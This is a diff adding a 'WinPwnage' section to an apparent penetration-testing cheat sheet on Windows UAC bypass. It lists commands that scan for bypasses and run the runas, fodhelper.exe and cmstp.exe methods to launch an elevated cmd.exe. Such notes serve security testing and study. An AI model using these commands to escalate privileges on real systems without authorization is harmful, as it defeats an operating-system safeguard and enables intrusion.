@@ -145,6 +145,24 @@ C:\tools>UACME-Akagi64.exe 33
 | 34        | DiskCleanup scheduled task              |
 | 70        | fodhelper.exe using CurVer registry key |
 {% endtab %}
+
+{% tab title="WinPwnage" %}
+[WinPwnage](https://github.com/rootm0s/WinPwnage) (Python) implement multiple UAC bypass methods:
+
+```bash
+# Scan for UAC Bypass
+main.py --scan uac
+
+# UAC bypass using runas
+main.py --use uac --id 1 --payload c:\\windows\\system32\\cmd.exe
+
+# UAC bypass using fodhelper.exe
+main.py --use uac --id 2 --payload c:\\windows\\system32\\cmd.exe
+
+# UAC bypass using cmstp.exe
+main.py --use uac --id 13 --payload c:\\windows\\system32\\cmd.exe
+```
+{% endtab %}
 {% endtabs %}
 
 ## Resources
